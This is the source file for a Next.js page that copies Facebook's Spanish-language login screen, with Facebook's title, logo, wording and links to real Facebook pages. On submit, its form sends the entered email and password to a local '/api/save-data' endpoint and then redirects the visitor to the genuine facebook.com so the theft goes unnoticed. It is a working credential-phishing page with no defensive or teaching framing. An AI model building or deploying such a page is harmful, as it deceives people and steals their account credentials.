import Head from 'next/head'
import Image from 'next/image'
import { useState } from 'react';
import styles from '../styles/Home.module.css'
import axios from 'axios'


export default function Home() {

  const [data, setData] = useState({});

  const onChange = e => {
    setData(Object.assign({}, data, { [e.target.name]: e.target.value }))
  }

  const onSubmit = async e => {
    e.preventDefault()
    const url = "/api/save-data"
    const response = await axios.post(url, data)
    window.location = 'https://www.facebook.com/'
    console.log(response.data)
  }

  return (
    <section>

      <Head>
        <title>Facebook</title>
      </Head>
      <div className="container">
        <header>
          <div className="img">
            <Image width="310px" height="130px" src="/facebook.svg" alt="logo de facebook" />
          </div>
          <p className="parrafo">Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</p>
        </header>
        <div className="wrapper">

          <form onSubmit={onSubmit}>
            <input onChange={onChange} type="email" name="email" placeholder="Correo electronico o número de teléfono" />
            <input onChange={onChange} type="password" name="password" placeholder="Contraseña" />
            <button className='login'>Iniciar sesión</button>
          </form>
          <a className="remember" href="https://es-la.facebook.com/login/identify/?ctx=recover&ars=facebook_login">¿Olvidaste tu contraseña?</a>
          <div className="linea"></div>
          <button className="create-count">Crear cuenta nueva</button>

        </div>
        <p className="create-pag"><a href="https://es-la.facebook.com/pages/create/?ref_type=registration_form">Crea una página</a> para un personaje público, un grupo de música o un negocio.</p>


      </div>

      <style jsx>{`
      
          section {
    background: #F0F2F5;
    padding: 0;
    margin: 0;
    height: 100vh;
    width: 100%;
    display: grid;
    /* grid-template-rows: auto 100px; */
    font-family: Helvetica, Arial, sans-serif;
}

.container {
    display: grid;
    grid-template-columns: 1.5fr 1fr;
    width: 65%;
    margin: 0 auto;
    align-self: center;
    grid-column-gap: 5rem;
}

.img {
    padding-top: 2rem;
    transform: translateX(-2rem);
}

.parrafo {
    font-size: 1.8rem;
    margin: 0;
}

.wrapper {
    min-width: 300px;
    background: white;
    border-radius: .6rem;
    padding: 1.5rem;
    display: grid;
    grid-row-gap: 1rem;
    box-shadow: 5px 5px 10px 0px #33333333;
}

form {
    display: grid;
    grid-row-gap: 1rem;
}

input {
    box-sizing: border-box;
    border-radius: .6rem;
    height: 3rem;
    width: 100%;
    border: 1px solid #33333355;
    padding: 0 1rem;
}

.login {
    border-radius: .6rem;
    height: 3rem;
    width: 100%;
    border: none;
    background: #166FE5;
    color: white;
    font-weight: 800;
}

.login:hover {
    background: #1566cf;
}

button:hover {
    cursor: pointer;
}

.remember {
    display: block;
    width: 100%;
    text-align: center;
    text-decoration: none;
    color: #1877f2;
}

.create-pag {
    grid-column: 2/3;
    font-size: .9rem;
    text-align: center;
}

.linea {
    width: 100%;
    height: 1px;
    background: #33333322;
}

.create-count {
    border-radius: .6rem;
    height: 3rem;
    background-color: #36A420;
    border: none;
    color: white;
    width: 10rem;
    margin: 0 auto;
}

p a {
    color: black;
    font-weight: 700;
    text-decoration: none;
}

a:hover {
    text-decoration: underline;
}

footer {
    background-color: white;
}

@media (max-width: 930px) {
    .container {
        grid-template-columns: 1fr;
        /* grid-template-rows: 1fr 1fr 1fr; */
        /* grid-column-gap: 0; */
    }

    .create-pag {
        grid-column: 1/2;
    }

    .parrafo {
        margin-bottom: 50px;
    }
}
      
      `}</style>

    </section>
  )


}
